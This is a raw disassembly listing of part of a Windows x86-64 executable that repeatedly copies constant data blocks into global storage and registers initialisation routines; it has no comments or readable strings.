   1400070ae:	66 0f 7f 05 4a c3 2b 	movdqa %xmm0,0x2bc34a(%rip)        # 0x1402c3400
   1400070b5:	00 
   1400070b6:	48 b8 96 00 a8 00 96 	movabs $0x33009600a80096,%rax
   1400070bd:	00 33 00 
   1400070c0:	48 89 05 47 c3 2b 00 	mov    %rax,0x2bc347(%rip)        # 0x1402c340e
   1400070c7:	48 8d 0d c2 0f 00 00 	lea    0xfc2(%rip),%rcx        # 0x140008090
   1400070ce:	e8 9d a2 ff ff       	call   0x140001370
   1400070d3:	c6 05 97 c1 2b 00 01 	movb   $0x1,0x2bc197(%rip)        # 0x1402c3271
   1400070da:	80 3d 35 c3 2b 00 00 	cmpb   $0x0,0x2bc335(%rip)        # 0x1402c3416
   1400070e1:	0f 85 f0 cc ff ff    	jne    0x140003dd7
   1400070e7:	e9 b4 cd ff ff       	jmp    0x140003ea0
   1400070ec:	c6 05 45 c3 2b 00 01 	movb   $0x1,0x2bc345(%rip)        # 0x1402c3438
   1400070f3:	66 0f 6f 05 35 45 00 	movdqa 0x4535(%rip),%xmm0        # 0x14000b630
   1400070fa:	00 
   1400070fb:	66 0f 7f 05 1d c3 2b 	movdqa %xmm0,0x2bc31d(%rip)        # 0x1402c3420
   140007102:	00 
   140007103:	48 b8 8e 00 93 00 7c 	movabs $0x3f007c0093008e,%rax
   14000710a:	00 3f 00 
   14000710d:	48 89 05 1c c3 2b 00 	mov    %rax,0x2bc31c(%rip)        # 0x1402c3430
   140007114:	48 8d 0d b5 0f 00 00 	lea    0xfb5(%rip),%rcx        # 0x1400080d0
   14000711b:	e8 50 a2 ff ff       	call   0x140001370
   140007120:	c6 05 4b c1 2b 00 01 	movb   $0x1,0x2bc14b(%rip)        # 0x1402c3272
   140007127:	80 3d 0a c3 2b 00 00 	cmpb   $0x0,0x2bc30a(%rip)        # 0x1402c3438
   14000712e:	0f 85 e8 ce ff ff    	jne    0x14000401c
   140007134:	e9 2a cf ff ff       	jmp    0x140004063
   140007139:	c6 05 6e c3 2b 00 01 	movb   $0x1,0x2bc36e(%rip)        # 0x1402c34ae
   140007140:	0f 10 05 fb 4a 00 00 	movups 0x4afb(%rip),%xmm0        # 0x14000bc42
   140007147:	0f 29 05 12 c3 2b 00 	movaps %xmm0,0x2bc312(%rip)        # 0x1402c3460
   14000714e:	0f 10 05 fd 4a 00 00 	movups 0x4afd(%rip),%xmm0        # 0x14000bc52
   140007155:	0f 29 05 14 c3 2b 00 	movaps %xmm0,0x2bc314(%rip)        # 0x1402c3470
   14000715c:	0f 10 05 ff 4a 00 00 	movups 0x4aff(%rip),%xmm0        # 0x14000bc62
   140007163:	0f 29 05 16 c3 2b 00 	movaps %xmm0,0x2bc316(%rip)        # 0x1402c3480
   14000716a:	0f 10 05 01 4b 00 00 	movups 0x4b01(%rip),%xmm0        # 0x14000bc72
   140007171:	0f 29 05 18 c3 2b 00 	movaps %xmm0,0x2bc318(%rip)        # 0x1402c3490
   140007178:	f3 0f 6f 05 00 4b 00 	movdqu 0x4b00(%rip),%xmm0        # 0x14000bc80
   14000717f:	00 
   140007180:	f3 0f 7f 05 16 c3 2b 	movdqu %xmm0,0x2bc316(%rip)        # 0x1402c349e
   140007187:	00 
   140007188:	48 8d 0d 81 0f 00 00 	lea    0xf81(%rip),%rcx        # 0x140008110
   14000718f:	e8 dc a1 ff ff       	call   0x140001370
   140007194:	c6 05 d9 c0 2b 00 01 	movb   $0x1,0x2bc0d9(%rip)        # 0x1402c3274
   14000719b:	80 3d 0c c3 2b 00 00 	cmpb   $0x0,0x2bc30c(%rip)        # 0x1402c34ae
   1400071a2:	0f 85 c1 cf ff ff    	jne    0x140004169
   1400071a8:	e9 b7 d0 ff ff       	jmp    0x140004264
   1400071ad:	c6 05 66 c3 2b 00 01 	movb   $0x1,0x2bc366(%rip)        # 0x1402c351a
   1400071b4:	66 0f 6f 05 04 45 00 	movdqa 0x4504(%rip),%xmm0        # 0x14000b6c0
   1400071bb:	00 
   1400071bc:	66 0f 7f 05 3c c3 2b 	movdqa %xmm0,0x2bc33c(%rip)        # 0x1402c3500
   1400071c3:	00 
   1400071c4:	48 b8 78 00 8b 00 78 	movabs $0x740078008b0078,%rax
   1400071cb:	00 74 00 
   1400071ce:	48 89 05 3b c3 2b 00 	mov    %rax,0x2bc33b(%rip)        # 0x1402c3510
   1400071d5:	66 c7 05 3a c3 2b 00 	movw   $0x37,0x2bc33a(%rip)        # 0x1402c3518
   1400071dc:	37 00 
   1400071de:	48 8d 0d 0b 11 00 00 	lea    0x110b(%rip),%rcx        # 0x1400082f0
   1400071e5:	e8 86 a1 ff ff       	call   0x140001370
   1400071ea:	c6 05 85 c0 2b 00 01 	movb   $0x1,0x2bc085(%rip)        # 0x1402c3276
   1400071f1:	80 3d 22 c3 2b 00 00 	cmpb   $0x0,0x2bc322(%rip)        # 0x1402c351a
   1400071f8:	0f 85 bb d0 ff ff    	jne    0x1400042b9
   1400071fe:	e9 12 d1 ff ff       	jmp    0x140004315
   140007203:	48 8d 0d 86 4a 00 00 	lea    0x4a86(%rip),%rcx        # 0x14000bc90
   14000720a:	e8 31 0f 00 00       	call   0x140008140
   14000720f:	48 8d 0d aa 10 00 00 	lea    0x10aa(%rip),%rcx        # 0x1400082c0
   140007216:	e8 55 a1 ff ff       	call   0x140001370
   14000721b:	c6 05 53 c0 2b 00 01 	movb   $0x1,0x2bc053(%rip)        # 0x1402c3275
   140007222:	80 3d cb c2 2b 00 00 	cmpb   $0x0,0x2bc2cb(%rip)        # 0x1402c34f4
   140007229:	0f 85 5c d1 ff ff    	jne    0x14000438b
   14000722f:	e9 f1 d1 ff ff       	jmp    0x140004425
   140007234:	48 8d 0d 99 4a 00 00 	lea    0x4a99(%rip),%rcx        # 0x14000bcd4
   14000723b:	e8 d0 10 00 00       	call   0x140008310
   140007240:	48 8d 0d 29 12 00 00 	lea    0x1229(%rip),%rcx        # 0x140008470
   140007247:	e8 24 a1 ff ff       	call   0x140001370
   14000724c:	c6 05 24 c0 2b 00 01 	movb   $0x1,0x2bc024(%rip)        # 0x1402c3277
   140007253:	80 3d 04 c3 2b 00 00 	cmpb   $0x0,0x2bc304(%rip)        # 0x1402c355e
   14000725a:	0f 85 65 d2 ff ff    	jne    0x1400044c5
   140007260:	e9 51 d3 ff ff       	jmp    0x1400045b6
   140007265:	c6 05 06 c3 2b 00 01 	movb   $0x1,0x2bc306(%rip)        # 0x1402c3572
   14000726c:	66 0f 6f 05 7c 44 00 	movdqa 0x447c(%rip),%xmm0        # 0x14000b6f0
   140007273:	00 
   140007274:	66 0f 7f 05 e4 c2 2b 	movdqa %xmm0,0x2bc2e4(%rip)        # 0x1402c3560
   14000727b:	00 
   14000727c:	66 c7 05 eb c2 2b 00 	movw   $0x7b,0x2bc2eb(%rip)        # 0x1402c3570
   140007283:	7b 00 
   140007285:	48 8d 0d 04 12 00 00 	lea    0x1204(%rip),%rcx        # 0x140008490
   14000728c:	e8 df a0 ff ff       	call   0x140001370
   140007291:	c6 05 e0 bf 2b 00 01 	movb   $0x1,0x2bbfe0(%rip)        # 0x1402c3278
   140007298:	80 3d d3 c2 2b 00 00 	cmpb   $0x0,0x2bc2d3(%rip)        # 0x1402c3572
   14000729f:	0f 85 88 d3 ff ff    	jne    0x14000462d
   1400072a5:	e9 bf d3 ff ff       	jmp    0x140004669
   1400072aa:	c6 05 e7 c2 2b 00 01 	movb   $0x1,0x2bc2e7(%rip)        # 0x1402c3598
   1400072b1:	66 0f 6f 05 57 44 00 	movdqa 0x4457(%rip),%xmm0        # 0x14000b710
   1400072b8:	00 
   1400072b9:	66 0f 7f 05 bf c2 2b 	movdqa %xmm0,0x2bc2bf(%rip)        # 0x1402c3580
   1400072c0:	00 
   1400072c1:	48 b8 82 00 95 00 82 	movabs $0x1d008200950082,%rax
   1400072c8:	00 1d 00 
   1400072cb:	48 89 05 be c2 2b 00 	mov    %rax,0x2bc2be(%rip)        # 0x1402c3590
   1400072d2:	48 8d 0d d7 11 00 00 	lea    0x11d7(%rip),%rcx        # 0x1400084b0
   1400072d9:	e8 92 a0 ff ff       	call   0x140001370
   1400072de:	c6 05 94 bf 2b 00 01 	movb   $0x1,0x2bbf94(%rip)        # 0x1402c3279
   1400072e5:	80 3d ac c2 2b 00 00 	cmpb   $0x0,0x2bc2ac(%rip)        # 0x1402c3598
   1400072ec:	0f 85 c6 d3 ff ff    	jne    0x1400046b8
   1400072f2:	e9 08 d4 ff ff       	jmp    0x1400046ff
   1400072f7:	c6 05 b2 c2 2b 00 01 	movb   $0x1,0x2bc2b2(%rip)        # 0x1402c35b0
   1400072fe:	66 0f 6f 05 3a 44 00 	movdqa 0x443a(%rip),%xmm0        # 0x14000b740
   140007305:	00 
   140007306:	66 0f 7f 05 92 c2 2b 	movdqa %xmm0,0x2bc292(%rip)        # 0x1402c35a0
   14000730d:	00 
   14000730e:	48 8d 0d bb 11 00 00 	lea    0x11bb(%rip),%rcx        # 0x1400084d0
   140007315:	e8 56 a0 ff ff       	call   0x140001370
   14000731a:	c6 05 59 bf 2b 00 01 	movb   $0x1,0x2bbf59(%rip)        # 0x1402c327a
   140007321:	80 3d 88 c2 2b 00 00 	cmpb   $0x0,0x2bc288(%rip)        # 0x1402c35b0
   140007328:	0f 85 20 d4 ff ff    	jne    0x14000474e
   14000732e:	e9 42 d4 ff ff       	jmp    0x140004775
   140007333:	c6 05 5c c3 2b 00 01 	movb   $0x1,0x2bc35c(%rip)        # 0x1402c3696
   14000733a:	48 8d 0d 7f c2 2b 00 	lea    0x2bc27f(%rip),%rcx        # 0x1402c35c0
   140007341:	48 8d 15 ca 49 00 00 	lea    0x49ca(%rip),%rdx        # 0x14000bd12
   140007348:	41 b8 d6 00 00 00    	mov    $0xd6,%r8d
   14000734e:	e8 ed 2b 00 00       	call   0x140009f40
   140007353:	48 8d 0d 86 11 00 00 	lea    0x1186(%rip),%rcx        # 0x1400084e0
   14000735a:	e8 11 a0 ff ff       	call   0x140001370
   14000735f:	c6 05 15 bf 2b 00 01 	movb   $0x1,0x2bbf15(%rip)        # 0x1402c327b
   140007366:	80 3d 29 c3 2b 00 00 	cmpb   $0x0,0x2bc329(%rip)        # 0x1402c3696
   14000736d:	0f 85 41 d4 ff ff    	jne    0x1400047b4
   140007373:	e9 c1 d5 ff ff       	jmp    0x140004939
   140007378:	c6 05 87 c3 2b 00 01 	movb   $0x1,0x2bc387(%rip)        # 0x1402c3706
   14000737f:	0f 10 05 62 4a 00 00 	movups 0x4a62(%rip),%xmm0        # 0x14000bde8
   140007386:	0f 29 05 13 c3 2b 00 	movaps %xmm0,0x2bc313(%rip)        # 0x1402c36a0
   14000738d:	0f 10 05 64 4a 00 00 	movups 0x4a64(%rip),%xmm0        # 0x14000bdf8
   140007394:	0f 29 05 15 c3 2b 00 	movaps %xmm0,0x2bc315(%rip)        # 0x1402c36b0
   14000739b:	0f 10 05 66 4a 00 00 	movups 0x4a66(%rip),%xmm0        # 0x14000be08
   1400073a2:	0f 29 05 17 c3 2b 00 	movaps %xmm0,0x2bc317(%rip)        # 0x1402c36c0
   1400073a9:	0f 10 05 68 4a 00 00 	movups 0x4a68(%rip),%xmm0        # 0x14000be18
   1400073b0:	0f 29 05 19 c3 2b 00 	movaps %xmm0,0x2bc319(%rip)        # 0x1402c36d0
   1400073b7:	0f 10 05 6a 4a 00 00 	movups 0x4a6a(%rip),%xmm0        # 0x14000be28
   1400073be:	0f 29 05 1b c3 2b 00 	movaps %xmm0,0x2bc31b(%rip)        # 0x1402c36e0
   1400073c5:	f3 0f 6f 05 6b 4a 00 	movdqu 0x4a6b(%rip),%xmm0        # 0x14000be38
   1400073cc:	00 
   1400073cd:	66 0f 7f 05 1b c3 2b 	movdqa %xmm0,0x2bc31b(%rip)        # 0x1402c36f0
   1400073d4:	00 
   1400073d5:	48 b8 e8 00 f9 00 fb 	movabs $0x8700fb00f900e8,%rax
   1400073dc:	00 87 00 
   1400073df:	48 89 05 18 c3 2b 00 	mov    %rax,0x2bc318(%rip)        # 0x1402c36fe
   1400073e6:	48 8d 0d 63 11 00 00 	lea    0x1163(%rip),%rcx        # 0x140008550
   1400073ed:	e8 7e 9f ff ff       	call   0x140001370
   1400073f2:	c6 05 83 be 2b 00 01 	movb   $0x1,0x2bbe83(%rip)        # 0x1402c327c
   1400073f9:	80 3d 06 c3 2b 00 00 	cmpb   $0x0,0x2bc306(%rip)        # 0x1402c3706
   140007400:	0f 85 6a d5 ff ff    	jne    0x140004970
   140007406:	e9 42 d6 ff ff       	jmp    0x140004a4d
   14000740b:	c6 05 10 c3 2b 00 01 	movb   $0x1,0x2bc310(%rip)        # 0x1402c3722
   140007412:	66 0f 6f 05 66 43 00 	movdqa 0x4366(%rip),%xmm0        # 0x14000b780
   140007419:	00 
   14000741a:	66 0f 7f 05 ee c2 2b 	movdqa %xmm0,0x2bc2ee(%rip)        # 0x1402c3710
   140007421:	00 
   140007422:	66 c7 05 f5 c2 2b 00 	movw   $0xf5,0x2bc2f5(%rip)        # 0x1402c3720
   140007429:	f5 00 
   14000742b:	48 8d 0d 5e 11 00 00 	lea    0x115e(%rip),%rcx        # 0x140008590
   140007432:	e8 39 9f ff ff       	call   0x140001370
   140007437:	c6 05 3f be 2b 00 01 	movb   $0x1,0x2bbe3f(%rip)        # 0x1402c327d
   14000743e:	80 3d dd c2 2b 00 00 	cmpb   $0x0,0x2bc2dd(%rip)        # 0x1402c3722
   140007445:	0f 85 49 d6 ff ff    	jne    0x140004a94
   14000744b:	e9 7e d6 ff ff       	jmp    0x140004ace
   140007450:	c6 05 6b be 2b 00 01 	movb   $0x1,0x2bbe6b(%rip)        # 0x1402c32c2
   140007457:	48 b8 17 00 fa 00 fa 	movabs $0x1700fa00fa0017,%rax
   14000745e:	00 17 00 
   140007461:	48 89 05 50 be 2b 00 	mov    %rax,0x2bbe50(%rip)        # 0x1402c32b8
   140007468:	66 c7 05 4f be 2b 00 	movw   $0xbb,0x2bbe4f(%rip)        # 0x1402c32c0
   14000746f:	bb 00 
   140007471:	48 8d 0d 48 c4 ff ff 	lea    -0x3bb8(%rip),%rcx        # 0x1400038c0
   140007478:	e8 f3 9e ff ff       	call   0x140001370
   14000747d:	c6 05 e5 bd 2b 00 01 	movb   $0x1,0x2bbde5(%rip)        # 0x1402c3269
   140007484:	80 3d 37 be 2b 00 00 	cmpb   $0x0,0x2bbe37(%rip)        # 0x1402c32c2
   14000748b:	0f 85 8f d6 ff ff    	jne    0x140004b20
   140007491:	e9 c4 d6 ff ff       	jmp    0x140004b5a
   140007496:	c6 05 f7 c2 2b 00 01 	movb   $0x1,0x2bc2f7(%rip)        # 0x1402c3794
   14000749d:	0f 10 05 aa 49 00 00 	movups 0x49aa(%rip),%xmm0        # 0x14000be4e
   1400074a4:	0f 29 05 85 c2 2b 00 	movaps %xmm0,0x2bc285(%rip)        # 0x1402c3730
   1400074ab:	0f 10 05 ac 49 00 00 	movups 0x49ac(%rip),%xmm0        # 0x14000be5e
   1400074b2:	0f 29 05 87 c2 2b 00 	movaps %xmm0,0x2bc287(%rip)        # 0x1402c3740
   1400074b9:	0f 10 05 ae 49 00 00 	movups 0x49ae(%rip),%xmm0        # 0x14000be6e
   1400074c0:	0f 29 05 89 c2 2b 00 	movaps %xmm0,0x2bc289(%rip)        # 0x1402c3750
   1400074c7:	0f 10 05 b0 49 00 00 	movups 0x49b0(%rip),%xmm0        # 0x14000be7e
   1400074ce:	0f 29 05 8b c2 2b 00 	movaps %xmm0,0x2bc28b(%rip)        # 0x1402c3760
   1400074d5:	0f 10 05 b2 49 00 00 	movups 0x49b2(%rip),%xmm0        # 0x14000be8e
   1400074dc:	0f 29 05 8d c2 2b 00 	movaps %xmm0,0x2bc28d(%rip)        # 0x1402c3770
   1400074e3:	f3 0f 6f 05 b3 49 00 	movdqu 0x49b3(%rip),%xmm0        # 0x14000be9e
   1400074ea:	00 
   1400074eb:	66 0f 7f 05 8d c2 2b 	movdqa %xmm0,0x2bc28d(%rip)        # 0x1402c3780
   1400074f2:	00 
   1400074f3:	c7 05 93 c2 2b 00 47 	movl   $0xf30047,0x2bc293(%rip)        # 0x1402c3790
   1400074fa:	00 f3 00 
   1400074fd:	48 8d 0d ac 10 00 00 	lea    0x10ac(%rip),%rcx        # 0x1400085b0
   140007504:	e8 67 9e ff ff       	call   0x140001370
   140007509:	c6 05 6e bd 2b 00 01 	movb   $0x1,0x2bbd6e(%rip)        # 0x1402c327e
   140007510:	e9 6e d7 ff ff       	jmp    0x140004c83
   140007515:	c6 05 d2 c2 2b 00 01 	movb   $0x1,0x2bc2d2(%rip)        # 0x1402c37ee
   14000751c:	66 0f 6f 05 bc 42 00 	movdqa 0x42bc(%rip),%xmm0        # 0x14000b7e0
   140007523:	00 
   140007524:	66 0f 7f 05 a4 c2 2b 	movdqa %xmm0,0x2bc2a4(%rip)        # 0x1402c37d0
   14000752b:	00 
   14000752c:	48 b8 ea 00 08 00 04 	movabs $0xe80004000800ea,%rax
   140007533:	00 e8 00 
   140007536:	48 89 05 a3 c2 2b 00 	mov    %rax,0x2bc2a3(%rip)        # 0x1402c37e0
   14000753d:	c7 05 a1 c2 2b 00 0b 	movl   $0xf8000b,0x2bc2a1(%rip)        # 0x1402c37e8
   140007544:	00 f8 00 
   140007547:	66 c7 05 9c c2 2b 00 	movw   $0x95,0x2bc29c(%rip)        # 0x1402c37ec
   14000754e:	95 00 
   140007550:	48 8d 0d a9 11 00 00 	lea    0x11a9(%rip),%rcx        # 0x140008700
   140007557:	e8 14 9e ff ff       	call   0x140001370
   14000755c:	c6 05 1d bd 2b 00 01 	movb   $0x1,0x2bbd1d(%rip)        # 0x1402c3280
   140007563:	80 3d 84 c2 2b 00 00 	cmpb   $0x0,0x2bc284(%rip)        # 0x1402c37ee
   14000756a:	0f 85 d8 d9 ff ff    	jne    0x140004f48
   140007570:	e9 4d da ff ff       	jmp    0x140004fc2
   140007575:	48 8d 0d 60 49 00 00 	lea    0x4960(%rip),%rcx        # 0x14000bedc
   14000757c:	e8 9f 11 00 00       	call   0x140008720
   140007581:	48 8d 0d 88 12 00 00 	lea    0x1288(%rip),%rcx        # 0x140008810
   140007588:	e8 e3 9d ff ff       	call   0x140001370
   14000758d:	c6 05 ed bc 2b 00 01 	movb   $0x1,0x2bbced(%rip)        # 0x1402c3281
   140007594:	80 3d 7f c2 2b 00 00 	cmpb   $0x0,0x2bc27f(%rip)        # 0x1402c381a
   14000759b:	0f 85 54 da ff ff    	jne    0x140004ff5
   1400075a1:	e9 c7 da ff ff       	jmp    0x14000506d
   1400075a6:	48 8d 0d 59 49 00 00 	lea    0x4959(%rip),%rcx        # 0x14000bf06
   1400075ad:	e8 7e 12 00 00       	call   0x140008830
   1400075b2:	48 8d 0d 47 13 00 00 	lea    0x1347(%rip),%rcx        # 0x140008900
   1400075b9:	e8 b2 9d ff ff       	call   0x140001370
   1400075be:	c6 05 bd bc 2b 00 01 	movb   $0x1,0x2bbcbd(%rip)        # 0x1402c3282
   1400075c5:	80 3d 76 c2 2b 00 00 	cmpb   $0x0,0x2bc276(%rip)        # 0x1402c3842
   1400075cc:	0f 85 ce da ff ff    	jne    0x1400050a0
   1400075d2:	e9 1f db ff ff       	jmp    0x1400050f6
   1400075d7:	c6 05 8c c2 2b 00 01 	movb   $0x1,0x2bc28c(%rip)        # 0x1402c386a
   1400075de:	66 0f 6f 05 6a 42 00 	movdqa 0x426a(%rip),%xmm0        # 0x14000b850
   1400075e5:	00 
   1400075e6:	66 0f 7f 05 62 c2 2b 	movdqa %xmm0,0x2bc262(%rip)        # 0x1402c3850
   1400075ed:	00 
   1400075ee:	48 b8 05 00 0c 00 17 	movabs $0x160017000c0005,%rax
   1400075f5:	00 16 00 
   1400075f8:	48 89 05 61 c2 2b 00 	mov    %rax,0x2bc261(%rip)        # 0x1402c3860
   1400075ff:	66 c7 05 60 c2 2b 00 	movw   $0xa3,0x2bc260(%rip)        # 0x1402c3868
   140007606:	a3 00 
   140007608:	48 8d 0d 11 13 00 00 	lea    0x1311(%rip),%rcx        # 0x140008920
   14000760f:	e8 5c 9d ff ff       	call   0x140001370
   140007614:	c6 05 68 bc 2b 00 01 	movb   $0x1,0x2bbc68(%rip)        # 0x1402c3283
   14000761b:	80 3d 48 c2 2b 00 00 	cmpb   $0x0,0x2bc248(%rip)        # 0x1402c386a
   140007622:	0f 85 01 db ff ff    	jne    0x140005129
   140007628:	e9 56 db ff ff       	jmp    0x140005183
   14000762d:	c6 05 58 c2 2b 00 01 	movb   $0x1,0x2bc258(%rip)        # 0x1402c388c
   140007634:	66 0f 6f 05 44 42 00 	movdqa 0x4244(%rip),%xmm0        # 0x14000b880
   14000763b:	00 
   14000763c:	66 0f 7f 05 2c c2 2b 	movdqa %xmm0,0x2bc22c(%rip)        # 0x1402c3870
   140007643:	00 
   140007644:	48 b8 4b 00 56 00 5a 	movabs $0x5d005a0056004b,%rax
   14000764b:	00 5d 00 
   14000764e:	48 89 05 2b c2 2b 00 	mov    %rax,0x2bc22b(%rip)        # 0x1402c3880
   140007655:	c7 05 29 c2 2b 00 4a 	movl   $0xe7004a,0x2bc229(%rip)        # 0x1402c3888
   14000765c:	00 e7 00 
   14000765f:	48 8d 0d da 12 00 00 	lea    0x12da(%rip),%rcx        # 0x140008940
   140007666:	e8 05 9d ff ff       	call   0x140001370
   14000766b:	c6 05 12 bc 2b 00 01 	movb   $0x1,0x2bbc12(%rip)        # 0x1402c3284
   140007672:	80 3d 13 c2 2b 00 00 	cmpb   $0x0,0x2bc213(%rip)        # 0x1402c388c
   140007679:	0f 85 37 db ff ff    	jne    0x1400051b6
   14000767f:	e9 99 db ff ff       	jmp    0x14000521d
   140007684:	c6 05 7b c2 2b 00 01 	movb   $0x1,0x2bc27b(%rip)        # 0x1402c3906
   14000768b:	0f 10 05 96 48 00 00 	movups 0x4896(%rip),%xmm0        # 0x14000bf28
   140007692:	0f 29 05 f7 c1 2b 00 	movaps %xmm0,0x2bc1f7(%rip)        # 0x1402c3890
   140007699:	0f 10 05 98 48 00 00 	movups 0x4898(%rip),%xmm0        # 0x14000bf38
   1400076a0:	0f 29 05 f9 c1 2b 00 	movaps %xmm0,0x2bc1f9(%rip)        # 0x1402c38a0
   1400076a7:	0f 10 05 9a 48 00 00 	movups 0x489a(%rip),%xmm0        # 0x14000bf48
   1400076ae:	0f 29 05 fb c1 2b 00 	movaps %xmm0,0x2bc1fb(%rip)        # 0x1402c38b0
   1400076b5:	0f 10 05 9c 48 00 00 	movups 0x489c(%rip),%xmm0        # 0x14000bf58
   1400076bc:	0f 29 05 fd c1 2b 00 	movaps %xmm0,0x2bc1fd(%rip)        # 0x1402c38c0
   1400076c3:	0f 10 05 9e 48 00 00 	movups 0x489e(%rip),%xmm0        # 0x14000bf68
   1400076ca:	0f 29 05 ff c1 2b 00 	movaps %xmm0,0x2bc1ff(%rip)        # 0x1402c38d0
   1400076d1:	0f 10 05 a0 48 00 00 	movups 0x48a0(%rip),%xmm0        # 0x14000bf78
   1400076d8:	0f 29 05 01 c2 2b 00 	movaps %xmm0,0x2bc201(%rip)        # 0x1402c38e0
   1400076df:	f3 0f 6f 05 a1 48 00 	movdqu 0x48a1(%rip),%xmm0        # 0x14000bf88
   1400076e6:	00 
   1400076e7:	66 0f 7f 05 01 c2 2b 	movdqa %xmm0,0x2bc201(%rip)        # 0x1402c38f0
   1400076ee:	00 
   1400076ef:	48 b8 e4 00 07 00 f4 	movabs $0x9100f4000700e4,%rax
   1400076f6:	00 91 00 
   1400076f9:	48 89 05 fe c1 2b 00 	mov    %rax,0x2bc1fe(%rip)        # 0x1402c38fe
   140007700:	48 8d 0d 59 12 00 00 	lea    0x1259(%rip),%rcx        # 0x140008960
   140007707:	e8 64 9c ff ff       	call   0x140001370
   14000770c:	c6 05 72 bb 2b 00 01 	movb   $0x1,0x2bbb72(%rip)        # 0x1402c3285
   140007713:	80 3d ec c1 2b 00 00 	cmpb   $0x0,0x2bc1ec(%rip)        # 0x1402c3906
   14000771a:	0f 85 34 db ff ff    	jne    0x140005254
   140007720:	e9 24 dc ff ff       	jmp    0x140005349
   140007725:	c6 05 fa c1 2b 00 01 	movb   $0x1,0x2bc1fa(%rip)        # 0x1402c3926
   14000772c:	66 0f 6f 05 9c 41 00 	movdqa 0x419c(%rip),%xmm0        # 0x14000b8d0
   140007733:	00 
   140007734:	66 0f 7f 05 d4 c1 2b 	movdqa %xmm0,0x2bc1d4(%rip)        # 0x1402c3910
   14000773b:	00 
   14000773c:	c7 05 da c1 2b 00 fc 	movl   $0x100fc,0x2bc1da(%rip)        # 0x1402c3920
   140007743:	00 01 00 
   140007746:	66 c7 05 d5 c1 2b 00 	movw   $0x91,0x2bc1d5(%rip)        # 0x1402c3924
   14000774d:	91 00 
   14000774f:	48 8d 0d 4a 12 00 00 	lea    0x124a(%rip),%rcx        # 0x1400089a0
   140007756:	e8 15 9c ff ff       	call   0x140001370
   14000775b:	c6 05 24 bb 2b 00 01 	movb   $0x1,0x2bbb24(%rip)        # 0x1402c3286
   140007762:	80 3d bd c1 2b 00 00 	cmpb   $0x0,0x2bc1bd(%rip)        # 0x1402c3926
   140007769:	0f 85 f0 db ff ff    	jne    0x14000535f
   14000776f:	e9 45 dc ff ff       	jmp    0x1400053b9
   140007774:	c6 05 37 c2 2b 00 01 	movb   $0x1,0x2bc237(%rip)        # 0x1402c39b2
   14000777b:	48 8d 0d ae c1 2b 00 	lea    0x2bc1ae(%rip),%rcx        # 0x1402c3930
   140007782:	48 8d 15 15 48 00 00 	lea    0x4815(%rip),%rdx        # 0x14000bf9e
   140007789:	41 b8 82 00 00 00    	mov    $0x82,%r8d
   14000778f:	e8 ac 27 00 00       	call   0x140009f40
   140007794:	48 8d 0d 25 12 00 00 	lea    0x1225(%rip),%rcx        # 0x1400089c0
   14000779b:	e8 d0 9b ff ff       	call   0x140001370
   1400077a0:	c6 05 e0 ba 2b 00 01 	movb   $0x1,0x2bbae0(%rip)        # 0x1402c3287
   1400077a7:	80 3d 04 c2 2b 00 00 	cmpb   $0x0,0x2bc204(%rip)        # 0x1402c39b2
   1400077ae:	0f 85 32 dc ff ff    	jne    0x1400053e6
   1400077b4:	e9 13 dd ff ff       	jmp    0x1400054cc
   1400077b9:	48 8d 0d 60 48 00 00 	lea    0x4860(%rip),%rcx        # 0x14000c020
   1400077c0:	e8 4b 12 00 00       	call   0x140008a10
   1400077c5:	48 8d 0d 14 13 00 00 	lea    0x1314(%rip),%rcx        # 0x140008ae0
   1400077cc:	e8 9f 9b ff ff       	call   0x140001370
   1400077d1:	c6 05 b0 ba 2b 00 01 	movb   $0x1,0x2bbab0(%rip)        # 0x1402c3288
   1400077d8:	80 3d 03 c2 2b 00 00 	cmpb   $0x0,0x2bc203(%rip)        # 0x1402c39e2
   1400077df:	0f 85 fd dc ff ff    	jne    0x1400054e2
   1400077e5:	e9 4e dd ff ff       	jmp    0x140005538
   1400077ea:	c6 05 79 c2 2b 00 01 	movb   $0x1,0x2bc279(%rip)        # 0x1402c3a6a
   1400077f1:	0f 10 05 4a 48 00 00 	movups 0x484a(%rip),%xmm0        # 0x14000c042
   1400077f8:	0f 29 05 f1 c1 2b 00 	movaps %xmm0,0x2bc1f1(%rip)        # 0x1402c39f0
   1400077ff:	0f 10 05 4c 48 00 00 	movups 0x484c(%rip),%xmm0        # 0x14000c052
   140007806:	0f 29 05 f3 c1 2b 00 	movaps %xmm0,0x2bc1f3(%rip)        # 0x1402c3a00
   14000780d:	0f 10 05 4e 48 00 00 	movups 0x484e(%rip),%xmm0        # 0x14000c062
   140007814:	0f 29 05 f5 c1 2b 00 	movaps %xmm0,0x2bc1f5(%rip)        # 0x1402c3a10
   14000781b:	0f 10 05 50 48 00 00 	movups 0x4850(%rip),%xmm0        # 0x14000c072
   140007822:	0f 29 05 f7 c1 2b 00 	movaps %xmm0,0x2bc1f7(%rip)        # 0x1402c3a20
   140007829:	0f 10 05 52 48 00 00 	movups 0x4852(%rip),%xmm0        # 0x14000c082
   140007830:	0f 29 05 f9 c1 2b 00 	movaps %xmm0,0x2bc1f9(%rip)        # 0x1402c3a30
   140007837:	0f 10 05 54 48 00 00 	movups 0x4854(%rip),%xmm0        # 0x14000c092
   14000783e:	0f 29 05 fb c1 2b 00 	movaps %xmm0,0x2bc1fb(%rip)        # 0x1402c3a40
   140007845:	0f 10 05 56 48 00 00 	movups 0x4856(%rip),%xmm0        # 0x14000c0a2
   14000784c:	0f 29 05 fd c1 2b 00 	movaps %xmm0,0x2bc1fd(%rip)        # 0x1402c3a50
   140007853:	f3 0f 6f 05 51 48 00 	movdqu 0x4851(%rip),%xmm0        # 0x14000c0ac
   14000785a:	00 
   14000785b:	f3 0f 7f 05 f7 c1 2b 	movdqu %xmm0,0x2bc1f7(%rip)        # 0x1402c3a5a
   140007862:	00 
   140007863:	48 8d 0d 96 12 00 00 	lea    0x1296(%rip),%rcx        # 0x140008b00
   14000786a:	e8 01 9b ff ff       	call   0x140001370
   14000786f:	c6 05 13 ba 2b 00 01 	movb   $0x1,0x2bba13(%rip)        # 0x1402c3289
   140007876:	80 3d ed c1 2b 00 00 	cmpb   $0x0,0x2bc1ed(%rip)        # 0x1402c3a6a
   14000787d:	0f 85 e2 dc ff ff    	jne    0x140005565
   140007883:	e9 f9 dd ff ff       	jmp    0x140005681
   140007888:	c6 05 fb c1 2b 00 01 	movb   $0x1,0x2bc1fb(%rip)        # 0x1402c3a8a
   14000788f:	66 0f 6f 05 79 40 00 	movdqa 0x4079(%rip),%xmm0        # 0x14000b910
   140007896:	00 
   140007897:	66 0f 7f 05 d1 c1 2b 	movdqa %xmm0,0x2bc1d1(%rip)        # 0x1402c3a70
